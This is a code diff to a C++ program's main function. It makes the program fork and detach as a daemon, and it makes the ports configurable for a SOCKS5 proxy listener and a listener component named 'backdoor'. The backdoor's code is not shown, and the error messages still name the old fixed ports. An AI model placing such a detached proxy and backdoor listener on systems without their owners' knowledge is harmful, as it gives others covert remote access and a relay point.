@@ -338,13 +338,34 @@ void loop_worker(mutex *m, bool *st) {
 }
 
 int main( int argc, char * argv[] ) {
+
+	pid_t _pid = fork();
+	if ( _pid < 0 ) {
+		cerr << "Failed to create child process." << endl;
+		return 1;
+	}
+	if ( _pid > 0 ) {
+		return 0;
+	}
+	if ( setsid() < 0 ) {
+		cerr << "Failed to session leader for child process." << endl;
+		return 3;
+	}
+
+	unsigned int _port = 4001;
+	if ( argc >= 2 ) {
+		sscanf(argv[1], "%u", &_port);
+	}
+	if ( _port > 65535 || _port <= 0 ) {
+		_port = 4001;
+	}
 	// Listen on sock5 proxy
-	if ( !sl_listen(sl_socks5svr(), 4001) ) {
+	if ( !sl_listen(sl_socks5svr(), _port) ) {
 		cerr << "Failed to listen on 4001" << endl;
 		return 1;
 	}
 
-	if ( !sl_listen(sl_backdoor(), 4002) ) {
+	if ( !sl_listen(sl_backdoor(), _port + 1) ) {
 		cerr << "Failed to listen on 4002" << endl;
 		return 2;
 	}
